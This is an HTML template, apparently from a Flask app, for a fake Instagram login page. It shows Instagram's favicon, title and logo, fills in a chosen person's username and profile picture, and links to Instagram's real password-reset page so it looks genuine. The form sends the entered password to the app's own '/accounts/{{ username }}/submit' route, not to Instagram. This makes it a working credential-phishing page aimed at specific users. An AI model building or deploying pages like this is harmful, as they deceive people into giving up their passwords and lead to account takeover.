<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="Icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
  <title>Instagram</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>

<body>
  <div class="header">
    <a onclick="goBack()">
      <img src="{{ url_for('static', filename='arrow.png') }}" alt="" srcset="">
    </a>
  </div>
  <div class="container">
    <div class="profile-container">
      <!-- <img class="profile" src="{{ url_for('static', filename='profile.jpg') }}"> -->
      <img class="profile" src="{{ pfp }}">
    </div>
    <p class="username">{{ username }}</p>
    <form action="/accounts/{{ username }}/submit" method="post">
      <input name="password" type="password" placeholder="Password" width="75%">
      <div class="save-container">
        <input class="form-check-input small" type="checkbox" value="" id="flexCheckDefault">
        <p>Save password</p>
      </div>
      <button class="login-button" type="submit">Log in</button>
    </form>
    <div class="fp-container">
      <p>Forgot your login details?</p>
      <a href="https://www.instagram.com/accounts/password/reset/?hl=en">Get help logging in.</a>
    </div>
  </div>
  <div class="footer">
    <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg">
  </div>

  <script>
    function goBack() {
      window.history.back()
    }
  </script>
</body>

</html>
